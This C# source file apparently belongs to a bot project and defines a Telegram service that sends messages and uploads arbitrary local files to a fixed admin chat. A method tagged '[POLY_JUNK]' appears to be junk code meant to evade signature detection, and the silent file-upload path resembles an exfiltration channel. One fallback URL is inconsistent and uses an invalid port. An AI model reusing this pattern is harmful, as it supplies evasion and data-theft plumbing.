using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace FinalBot
{
    public static class TelegramService
    {
        // [POLY_JUNK]
        private static void _vanguard_31fab2c8() {
            int val = 82600;
            if (val > 50000) Console.WriteLine("Hash:" + 82600);
        }

        private static HttpClient _client = new HttpClient();
        private static string? _botToken;
        private static string? _adminId;

        public static void Initialize(string token, string adminId, HttpClient? client = null)
        {
            _botToken = token;
            _adminId = adminId;
            if (client != null) _client = client;
        }

        private static string EscapeJson(string? s)
        {
            if (string.IsNullOrEmpty(s)) return "\"\"";
            StringBuilder sb = new StringBuilder();
            sb.Append("\"");
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        int i = (int)c;
                        if (i < 32 || i > 127) sb.AppendFormat("\\u{0:X4}", i);
                        else sb.Append(c);
                        break;
                }
            }
            sb.Append("\"");
            return sb.ToString();
        }

        public static async Task<bool> SendMessage(string text, string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;

            try
            {
                // V6.11: Use correct vault key (TG_API_BASE) and handle custom API endpoints
                var baseUrl = VanguardCore.SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";
                
                var url = $"{baseUrl}{_botToken}/sendMessage";
                var sb = new StringBuilder();
                sb.Append("{");
                sb.Append($"\"chat_id\":\"{_adminId}\",");
                sb.Append($"\"text\":{EscapeJson(text)},");
                sb.Append("\"parse_mode\":\"Html\"");
                if (!string.IsNullOrEmpty(replyMarkupJson))
                {
                    sb.Append($",\"reply_markup\":{replyMarkupJson}");
                }
                sb.Append("}");

                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
                var response = await _client.PostAsync(url, content);
                
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        public static async Task<bool> SendAnimation(string fileId, string caption = "", string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;

            try
            {
                var baseUrl = VanguardCore.SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "http://127.0.0.1:0000/bot";

                var url = $"{baseUrl}{_botToken}/sendAnimation";
                var sb = new StringBuilder();
                sb.Append("{");
                sb.Append($"\"chat_id\":\"{_adminId}\",");
                sb.Append($"\"animation\":\"{fileId}\",");
                sb.Append($"\"caption\":{EscapeJson(caption)},");
                sb.Append("\"parse_mode\":\"Html\"");
                if (!string.IsNullOrEmpty(replyMarkupJson))
                {
                    sb.Append($",\"reply_markup\":{replyMarkupJson}");
                }
                sb.Append("}");

                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
                var response = await _client.PostAsync(url, content);
                
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        public static async Task<bool> SendFile(string filePath, string caption = "", string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId) || !File.Exists(filePath)) 
                return false;

            try
            {
                var baseUrl = VanguardCore.SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "http://127.0.0.1:0000/bot";

                var url = $"{baseUrl}{_botToken}/sendDocument";
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(_adminId), "chat_id");
                
                if (!string.IsNullOrEmpty(caption))
                    form.Add(new StringContent(caption), "caption");

                if (!string.IsNullOrEmpty(replyMarkupJson))
                    form.Add(new StringContent(replyMarkupJson), "reply_markup");

                form.Add(new StringContent("Html"), "parse_mode");

                var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(filePath));
                form.Add(fileContent, "document", Path.GetFileName(filePath));

                var response = await _client.PostAsync(url, form);
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }
}
